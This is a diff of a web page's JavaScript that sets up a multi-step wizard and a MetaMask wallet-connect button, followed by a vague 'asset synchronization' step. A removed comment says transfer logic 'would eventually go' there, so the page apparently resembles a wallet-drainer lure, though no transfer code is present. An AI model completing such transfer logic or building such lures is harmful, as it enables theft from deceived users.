@@ -1,42 +1,37 @@
-window.addEventListener('DOMContentLoaded', (event) => {
-    console.log("Page loaded, initializing logic...");
+window.addEventListener('DOMContentLoaded', () => {
+    // Navigation Logic
+    document.getElementById('toStep2').onclick = () => {
+        document.getElementById('step-1').classList.add('hidden');
+        document.getElementById('step-2').classList.remove('hidden');
+    };
 
-    // 1. Handle Page Transitions
-    const startBtn = document.getElementById('startBtn');
-    if (startBtn) {
-        startBtn.onclick = () => {
-            console.log("Get Started clicked");
-            document.getElementById('landing-page').classList.add('hidden');
-            document.getElementById('connect-page').classList.remove('hidden');
-        };
-    }
+    document.getElementById('toStep3').onclick = () => {
+        document.getElementById('step-2').classList.add('hidden');
+        document.getElementById('step-3').classList.remove('hidden');
+    };
 
-    // 2. Handle Wallet Connection
-    const connectBtn = document.getElementById('connectBtn');
-    if (connectBtn) {
-        connectBtn.onclick = async () => {
-            const status = document.getElementById('status');
-            console.log("Connect Wallet clicked");
+    document.getElementById('toStep4').onclick = () => {
+        document.getElementById('step-3').classList.add('hidden');
+        document.getElementById('step-4').classList.remove('hidden');
+    };
 
-            if (window.ethereum) {
-                try {
-                    status.innerText = "Requesting authorization...";
-                    const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
-                    status.innerText = "Successfully connected: " + accounts[0].substring(0, 6) + "...";
-                    
-                    // After success, change the button purpose
-                    connectBtn.innerText = "Continue to Vault";
-                    connectBtn.onclick = () => {
-                        status.innerText = "Synchronizing assets...";
-                        // This is where the transfer logic would eventually go
-                    };
-                } catch (error) {
-                    status.innerText = "Connection failed. Please try again.";
-                    console.error(error);
-                }
-            } else {
-                status.innerText = "Please install a supported wallet (e.g., MetaMask).";
+    // Wallet Logic
+    document.getElementById('connectBtn').onclick = async () => {
+        const status = document.getElementById('status');
+        if (window.ethereum) {
+            try {
+                status.innerText = "Connecting...";
+                const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
+                status.innerText = "Connected: " + accounts[0].substring(0, 6) + "...";
+                document.getElementById('connectBtn').innerText = "Continue to Sync";
+                document.getElementById('connectBtn').onclick = () => {
+                    status.innerText = "Requesting asset synchronization...";
+                };
+            } catch (err) {
+                status.innerText = "Connection failed. Try again.";
             }
-        };
-    }
+        } else {
+            status.innerText = "Wallet not found. Install MetaMask or Coinbase Wallet.";
+        }
+    };
 });
